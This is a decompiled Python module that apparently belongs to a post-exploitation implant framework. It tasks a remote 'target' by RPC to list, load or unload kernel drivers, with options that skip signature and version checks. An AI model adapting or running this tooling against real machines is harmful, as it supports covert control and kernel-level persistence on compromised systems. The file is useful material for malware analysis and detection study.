# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Drivers_Tasking.py
DRIVERS_TYPE_LIST = 1
DRIVERS_TYPE_UNLOAD = 2
DRIVERS_TYPE_LOAD = 3

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.drivers', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.drivers.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.drivers.Params()
    tgtParams.provider = mcl.tasking.technique.Lookup('DRIVERS', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, lpParams['method'])
    if lpParams['no_signature']:
        tgtParams.flags |= mca.survey.cmd.drivers.PARAMS_FLAG_NO_SIGNATURE
    if lpParams['no_version']:
        tgtParams.flags |= mca.survey.cmd.drivers.PARAMS_FLAG_NO_VERSION
    if lpParams['file'] != None:
        tgtParams.name = lpParams['file']
    if lpParams['params'] != None:
        tgtParams.params = lpParams['params']
    if lpParams['type'] == DRIVERS_TYPE_LIST:
        rpc = mca.survey.cmd.drivers.tasking.RPC_INFO_LIST
    elif lpParams['type'] == DRIVERS_TYPE_LOAD:
        rpc = mca.survey.cmd.drivers.tasking.RPC_INFO_LOAD
    elif lpParams['type'] == DRIVERS_TYPE_UNLOAD:
        rpc = mca.survey.cmd.drivers.tasking.RPC_INFO_UNLOAD
    else:
        mcl.tasking.EchoError('Invalid type (%u)', lpParams['type'])
        return False
    taskXml = mcl.tasking.Tasking()
    taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, tgtParams.provider)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.drivers.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)